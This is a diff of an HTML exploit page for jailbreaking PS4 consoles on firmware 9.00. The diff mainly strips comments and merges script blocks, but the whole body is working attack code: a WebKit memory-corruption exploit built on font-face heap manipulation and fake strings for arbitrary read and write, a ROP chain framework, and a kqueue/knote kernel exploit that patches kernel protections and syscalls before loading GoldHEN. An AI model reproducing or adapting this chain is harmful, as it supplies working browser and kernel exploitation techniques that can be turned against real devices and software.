@@ -27,7 +27,6 @@
 	<body onload=setTimeout(poc,500)>
 		<div id=progress class="progress">Loading Exploit... Please Wait</div>
 		<script>
-		// espUSB
 		function disableUSB() {
 			var getpl = new XMLHttpRequest();
 			getpl.open("POST", "./usboff", true);
@@ -61,11 +60,7 @@
 	
 		function sleep(ms) {
 			return new Promise(resolve => setTimeout(resolve, ms));
-		}
-		// loader
-	
-		</script>
-		<script>
+		}	
 		function hen() {		
 			progress.innerHTML = "Loading Goldhen. Please wait..";
 			var req = new XMLHttpRequest();
@@ -90,7 +85,6 @@
 			}
 		};
 	}
-		// int64
 		function int64(low, hi) {
 			this.low = (low >>> 0);
 			this.hi = (hi >>> 0);
@@ -154,7 +148,7 @@
 			if(width > 0) {
 				return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
 			}
-			return number + ""; // always return a string
+			return number + "";
 		}
 	
 		function zeroFill(number, width) {
@@ -162,15 +156,11 @@
 			if(width > 0) {
 				return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
 			}
-			return number + ""; // always return a string
+			return number + "";
 		}
-		</script>
-		<script>
-		// rop
 		const stack_sz = 0x40000;
 		const reserve_upper_stack = 0x10000;
 		const stack_reserved_idx = reserve_upper_stack / 4;
-		// Class for quickly creating and managing a ROP chain
 		window.rop = function() {
 			this.stackback = p.malloc32(stack_sz / 4 + 0x8);
 			this.stack = this.stackback.add32(reserve_upper_stack);
@@ -249,7 +239,6 @@
 			this.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
 				return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
 			}
-			//get rsp of the next push
 			this.get_rsp = function() {
 				return this.stack.add32(this.count * 8);
 			}
@@ -322,9 +311,6 @@
 			}
 			return this;
 		};
-		</script>
-		<script>
-		// kexploit
 		var chain;
 		var kchain;
 		var kchain2;
@@ -383,7 +369,7 @@
 			"mov [rax], cl": 0xC6EAF,
 		};
 		var wkr_gadgetmap = {
-			"xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
+			"xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0
 		};
 		var wk2_gadgetmap = {
 			"mov [rax], rdi": 0xFFDD7,
@@ -398,19 +384,14 @@
 		};
 	
 		function userland() {
-			//RW -> ROP method is strongly based off of:
-			//https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit
 			p.launch_chain = launch_chain;
 			p.malloc = malloc;
 			p.malloc32 = malloc32;
 			p.stringify = stringify;
 			p.array_from_address = array_from_address;
 			p.readstr = readstr;
-			//pointer to vtable address
 			var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
-			//address of vtable
 			var textAreaVtable = p.read8(textAreaVtPtr);
-			//use address of 1st entry (in .text) to calculate webkitbase
 			webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
 			libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
 			libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
@@ -485,15 +466,15 @@
 			var original_context = p.malloc32(0x40);
 			var modified_context = p.malloc32(0x40);
 			p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
-			p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
+			p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two));
 			p.write8(fakeVtable_setjmp.add32(0x10), original_context);
 			p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
-			p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
+			p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one));
 			p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
-			p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
+			p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two));
 			p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
 			p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
-			p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
+			p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one));
 			function launch_chain(chain) {
 				chain.push(window.gadgets["pop rdi"]);
 				chain.push(original_context);
@@ -534,7 +515,6 @@
 			}
 			p.write8(kstr, orig_kview_buf);
 			chain = new rop();
-			//Sanity check
 			if(chain.syscall(20).low == 0) {
 				alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
 				while(1);
@@ -562,12 +542,10 @@
 		var ex_info;
 	
 		function load_prx(name) {
-			//sys_dynlib_load_prx
 			var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
 			if(res.low != 0x0) {
 				alert("failed to load prx/get handle " + name);
 			}
-			//sys_dynlib_get_info_ex
 			p.write8(ex_info, 0x1A8);
 			res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
 			if(res.low != 0x0) {
@@ -584,7 +562,6 @@
 			}
 			return tlsinit;
 		}
-		//Obtain extra gadgets through module loading
 		function extra_gadgets() {
 			handle = p.malloc(0x1E8);
 			var randomized_path_length_ptr = handle.add32(0x4);
@@ -607,12 +584,10 @@
 			}
 			for(var gadget in window.gadgets) {
 				p.read8(window.gadgets[gadget]);
-				//Ensure all gadgets are available to kernel.
 				chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
 			}
 			chain.run();
 		}
-		//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
 		function kchain_setup() {
 			const KERNEL_busy = 0x1B28DF8;
 			const KERNEL_bcopy = 0xACD;
@@ -646,13 +621,9 @@
 			const KERNEL_kqueue_close_epi = 0x398991;
 			SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
 			KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
-			//negative offset of kqueue string to kernel base
-			//0xFFFFFFFFFF86B593 0x505
-			//0xFFFFFFFFFF80E364 0x900
 			p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
 			kchain = new rop();
 			kchain2 = new rop();
-			//Ensure the krop stack remains available.
 			{
 				chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
 				chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
@@ -669,12 +640,10 @@
 			kchain.push(gadgets["pop r8"]);
 			kchain.push(KERNEL_BASE_PTR);
 			kchain.push(gadgets["add [r8], r12"]);
-			//Sorry we're closed
 			kchain.kwrite1(KERNEL_busy, 0x1);
-			kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.
+			kchain.push(gadgets["sti"]);
 			var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
 			var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
-			//Modify UD
 			kchain.push(gadgets["pop rdi"]);
 			kchain.push(0x6);
 			kchain.push(gadgets["pop rsi"]);
@@ -686,19 +655,17 @@
 			kchain.push(gadgets["pop r8"]);
 			kchain.push(0x0);
 			var idx1_dest = kchain.get_rsp();
-			kchain.pushSymbolic(); // overwritten with KERNEL_setidt
+			kchain.pushSymbolic();
 			kchain.push(gadgets["pop rsi"]);
 			kchain.push(0x80040033);
 			kchain.push(gadgets["pop rdi"]);
 			kchain.push(kchain2.stack);
 			var idx2_dest = kchain.get_rsp();
-			kchain.pushSymbolic(); // overwritten with KERNEL_setcr0
+			kchain.pushSymbolic();
 			kchain.finalizeSymbolic(idx1, idx1_dest);
 			kchain.finalizeSymbolic(idx2, idx2_dest);
-			//Initial patch(es)
 			kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
 			kchain2.kwrite1(KERNEL_bcopy, 0xEB);
-			//might as well do the others
 			kchain2.kwrite1(KERNEL_bzero, 0xEB);
 			kchain2.kwrite1(KERNEL_pagezero, 0xEB);
 			kchain2.kwrite1(KERNEL_memcpy, 0xEB);
@@ -706,16 +673,14 @@
 			kchain2.kwrite1(KERNEL_copyin, 0xEB);
 			kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
 			kchain2.kwrite1(KERNEL_copystr, 0xEB);
-			//I guess you're not all that bad...
-			kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again
-			//Restore original UD
+			kchain2.kwrite1(KERNEL_busy, 0x0); 
 			var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
 			var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
 			kchain2.push(gadgets["pop rdi"]);
 			kchain2.push(0x6);
 			kchain2.push(gadgets["pop rsi"]);
 			var idx3_dest = kchain2.get_rsp();
-			kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
+			kchain2.pushSymbolic();
 			kchain2.push(gadgets["pop rdx"]);
 			kchain2.push(0xE);
 			kchain2.push(gadgets["pop rcx"]);
@@ -723,12 +688,10 @@
 			kchain2.push(gadgets["pop r8"]);
 			kchain2.push(0x0);
 			var idx4_dest = kchain2.get_rsp();
-			kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 
+			kchain2.pushSymbolic(); 
 			kchain2.finalizeSymbolic(idx3, idx3_dest);
 			kchain2.finalizeSymbolic(idx4, idx4_dest);
-			//Apply kernel patches    
 			kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
-			//patch in reverse because /shrug
 			kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
 			kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
 			kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
@@ -742,15 +705,13 @@
 			kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
 			kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
 			kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
-			//Restore CR0
 			kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
 			var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
 			kchain2.push(gadgets["pop rdi"]);
 			kchain2.push(0x80050033);
 			var idx5_dest = kchain2.get_rsp();
-			kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
+			kchain2.pushSymbolic(); 
 			kchain2.finalizeSymbolic(idx5, idx5_dest);
-			//Recover
 			kchain2.rax_kernel(KERNEL_kqueue_close_epi);
 			kchain2.push(gadgets["mov rdx, rax"]);
 			kchain2.push(gadgets["pop rsi"]);
@@ -766,12 +727,11 @@
 			kchain2.push(gadgets["sti"]);
 			kchain2.push(gadgets["pop rsp"]);
 			var idx6_dest = kchain2.get_rsp();
-			kchain2.pushSymbolic(); // overwritten with old stack pointer
+			kchain2.pushSymbolic(); 
 			kchain2.finalizeSymbolic(idx6, idx6_dest);
 		}
 	
 		function object_setup() {
-			//Map fake object
 			var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
 			var fake_filtops = fake_knote.add32(0x4000);
 			var fake_obj = fake_knote.add32(0x8000);
@@ -779,30 +739,24 @@
 				alert("enomem: " + fake_knote);
 				while(1);
 			}
-			//setup fake object
-			//KNOTE
 			{
 				p.write8(fake_knote, fake_obj);
 				p.write8(fake_knote.add32(0x68), fake_filtops)
 			}
-			//FILTOPS
 			{
-				p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
-				p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
+				p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); 
+				p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); 
 				p.write8(fake_filtops.add32(0x8), kchain.stack);
-				p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
+				p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); 
 			}
-			//OBJ
 			{
-				p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
+				p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);
 			}
-			//Ensure the fake knote remains available
 			chain.syscall(203, fake_knote, 0xC000);
 		}
 		var trigger_spray = function() {
 			var NUM_KQUEUES = 0x1B0;
 			var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
-			//Make kqueues
 			{
 				for(var i = 0; i < NUM_KQUEUES; i++) {
 					chain.fcall(window.syscalls[362]);
@@ -816,32 +770,27 @@
 				alert("invalid socket");
 				while(1);
 			}
-			//Spray kevents
 			var kevent = p.malloc(0x20);
 			p.write8(kevent.add32(0x0), that_one_socket);
 			p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
 			p.write4(kevent.add32(0xC), 0x0);
 			p.write8(kevent.add32(0x10), 0x0);
 			p.write8(kevent.add32(0x18), 0x0);
-			//
 			{
 				for(var i = 0; i < NUM_KQUEUES; i++) {
 					chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
 				}
 			}
 			chain.run();
-			//Fragment memory
 			{
 				for(var i = 18; i < NUM_KQUEUES; i += 2) {
 					chain.fcall(window.syscalls[6], kqueues[i]);
 				}
 			}
 			chain.run();
-			//Trigger OOB
 			window.progress.innerHTML = "Activating ExFatHax USB...";
 			usbWaitTime=1*USBWait();
 			sleep(usbWaitTime).then(() => {
-				//Trigger corrupt knote
 				{
 					for(var i = 1; i < NUM_KQUEUES; i += 2) {
 						chain.fcall(window.syscalls[6], kqueues[i]);
@@ -849,11 +798,9 @@
 				}
 				chain.run();
 				if(chain.syscall(23, 0).low == 0) {
-					//cleanup fake knote & release locked gadgets/stack.
 					chain.fcall(window.syscalls[73], 0x4000, 0xC000);
 					chain.fcall(window.syscalls[325]);
 					chain.run();
-					//This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
 					var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
 					var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
 					patch_buffer_view[0] = 0x00000BB8;
@@ -1106,9 +1053,6 @@
 				}
 			});
 		}
-		</script>
-		<script>
-		// webkit
 		var PAGE_SIZE = 16384;
 		var SIZEOF_CSS_FONT_FACE = 0xb8;
 		var HASHMAP_BUCKET = 208;
@@ -1117,8 +1061,8 @@
 		var GUESS_FONT = 8602845184;
 		var NPAGES = 20;
 		var INVALID_POINTER = 0;
-		var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
-		var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
+		var HAMMER_FONT_NAME = "font8";
+		var HAMMER_NSTRINGS = 700;
 		function poc() {
 			function hex(n) {
 				if((typeof n) != "number") return "" + n;
@@ -1174,7 +1118,7 @@
 			var round = 0;
 			window.ffses = {};
 			do {
-				var p_s = ptrToString(NPAGES + 2); // vector.size()
+				var p_s = ptrToString(NPAGES + 2);
 				for(var i = 0; i < NPAGES; i++) p_s += ptrToString(guf + i * PAGE_SIZE);
 				p_s += ptrToString(INVALID_POINTER);
 				for(var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
@@ -1222,10 +1166,10 @@
 	
 			function makeReader(read_addr, ffs_name) {
 				var fake_s = '';
-				fake_s += '0000'; //padding for 8-byte alignment
-				fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
-				fake_s += ptrToString(read_addr); //where to read from
-				fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
+				fake_s += '0000'; 
+				fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; 
+				fake_s += ptrToString(read_addr); 
+				fake_s += ptrToString(0x80000014); 
 				p_s = '';
 				p_s += ptrToString(29);
 				p_s += ptrToString(guessed_addr);
@@ -1240,11 +1184,11 @@
 				bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
 				bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
 				needfix.push(relative_read);
-				if(relative_read.length < 1000) //failed
+				if(relative_read.length < 1000) 
 					return makeReader(read_addr, ffs_name + '_');
 				return relative_read;
 			}
-			var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr
+			var fastmalloc = makeReader(leak, 'ffs3'); 
 			for(var i = 0; i < 100000; i++) mkString(128, '');
 			var props = [];
 			for(var i = 0; i < 0x10000; i++) {
@@ -1263,33 +1207,29 @@
 				}
 			}
 			var rd_leak = makeReader(jsvalue_leak, 'ffs4');
-			var array256 = stringToPtr(rd_leak, 16); //arrays[256]
-			var ui32a = stringToPtr(rd_leak, 24); //Uint32Array
+			var array256 = stringToPtr(rd_leak, 16); 
+			var ui32a = stringToPtr(rd_leak, 24); 
 			var rd_arr = makeReader(array256, 'ffs5');
 			var butterfly = stringToPtr(rd_arr, 8);
 			var rd_ui32 = makeReader(ui32a, 'ffs6');
 			for(var i = 0; i < 8; i++) union_b[i] = rd_ui32.charCodeAt(i);
 			var structureid_low = union_i[0];
 			var structureid_high = union_i[1];
-			//setup for addrof/fakeobj
-			//in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
-			//in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
 			union_i[0] = 0x10000;
-			union_i[1] = 0; //account for nan-boxing
-			arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
+			union_i[1] = 0; 
+			arrays[257][1] = {}; 
 			arrays[257][0] = union_f[0];
 			union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
 			union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
 			arrays[256][i] = union_f[0];
-			//hammer time!
 			pp_s = '';
 			pp_s += ptrToString(56);
 			for(var i = 0; i < 12; i++) pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
 			var fake_s = '';
-			fake_s += '0000'; //padding for 8-byte alignment
-			fake_s += ptrToString(INVALID_POINTER); //never dereferenced
-			fake_s += ptrToString(butterfly); //hammer target
-			fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34
+			fake_s += '0000'; 
+			fake_s += ptrToString(INVALID_POINTER); 
+			fake_s += ptrToString(butterfly); 
+			fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; 
 			var ffs7_args = [];
 			for(var i = 0; i < 12; i++) ffs7_args.push(bad_fonts[guessed_font + i]);
 			ffs7_args.push(good_font);
@@ -1315,7 +1255,7 @@
 				arrays[258][0] = union_f[0];
 				return arrays[257][32];
 			}
-			//craft misaligned typedarray
+
 			var arw_master = new Uint32Array(8);
 			var arw_slave = new Uint8Array(1);
 			var obj_master = new Uint32Array(8);
@@ -1408,23 +1348,17 @@
 				magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
 				magic = null;
 			})();
-			//fix fucked objects to stabilize webkit
 			(function() {
-				//fix fontfaceset (memmoved 96 bytes to low, move back)
 				var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
 				write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
-				//fix strings (restore "valid") header
 				for(var i = 0; i < needfix.length; i++) {
 					var addr = read_ptr_at(addrof(needfix[i]) + 8);
 					write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
 					write_ptr_at(addr + 8, addr + 20);
 					write_ptr_at(addr + 16, 0x80000014);
 				}
-				//fix array butterfly
 				write_ptr_at(butterfly + 248, 0x1f0000001f);
 			})();
-			//^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
-			//create compat stuff for kexploit.js
 			var expl_master = new Uint32Array(8);
 			var expl_slave = new Uint32Array(2);
 			var addrof_expl_slave = addrof(expl_slave);
